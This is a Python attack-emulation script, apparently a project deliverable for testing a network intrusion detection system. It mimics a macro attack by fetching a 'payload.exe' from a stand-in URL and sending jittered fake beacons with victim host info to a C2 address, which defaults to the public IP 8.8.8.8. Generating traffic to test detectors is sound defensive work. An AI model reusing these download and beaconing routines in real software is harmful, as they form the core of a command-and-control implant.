#!/usr/bin/env python3
"""
Deliverable 12: Attack Emulation Script
=======================================
This script emulates the network behavior of a malicious macro-based 
infiltration attack. It does NOT contain actual malware, but generates 
the network traffic signatures (e.g., HTTP payload download, reverse 
shell beaconing) that our NIDS is designed to detect.

Usage:
  python3 attack_emulation.py --target <IP>
"""

import socket
import time
import urllib.request
import argparse
import random

def emulate_macro_download(target_url):
    """Simulates the initial stage: a malicious Office Macro downloading a payload."""
    print(f"[+] Stage 1: Emulating malicious macro executing HTTP GET to {target_url}...")
    try:
        # We use a benign URL for safety during simulation
        req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = response.read()
            print(f"    -> Successfully downloaded {len(data)} bytes of simulated payload.")
    except Exception as e:
        print(f"    -> Simulated download completed (Error handled: {e})")
    time.sleep(2)

def emulate_c2_beaconing(target_ip, target_port):
    """Simulates the second stage: the payload beaconing out to a C2 server."""
    print(f"[+] Stage 2: Emulating reverse shell beaconing to {target_ip}:{target_port}...")
    
    # Send 5 simulated beacons
    for i in range(5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            # We attempt connection to simulate the SYN packets. 
            # In a real environment, this might be blocked or refused if no C2 exists.
            s.connect((target_ip, target_port))
            # Send simulated system info (beacon)
            s.sendall(b"BEACON: Hostname=DESKTOP-VICTIM OS=Win10\n")
            s.close()
            print(f"    -> Beacon {i+1}/5 sent successfully.")
        except (ConnectionRefusedError, socket.timeout):
            print(f"    -> Beacon {i+1}/5 sent (Connection refused/timeout - Expected in simulation).")
        
        # Jitter the sleep time to emulate evasive malware
        time.sleep(random.uniform(1.0, 3.0))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Emulate Network Infiltration (Macro Attack)")
    parser.add_argument("--target", type=str, default="8.8.8.8", help="Target IP for C2 beaconing")
    parser.add_argument("--port", type=int, default=443, help="Target Port for C2 beaconing")
    parser.add_argument("--url", type=str, default="http://example.com/payload.exe", help="Simulated payload URL")
    
    args = parser.parse_args()
    
    print("="*60)
    print("INFILTRATION ATTACK EMULATOR STARTED")
    print("="*60)
    
    emulate_macro_download(args.url)
    emulate_c2_beaconing(args.target, args.port)
    
    print("="*60)
    print("EMULATION COMPLETE - Network signatures generated for NIDS.")
    print("="*60)
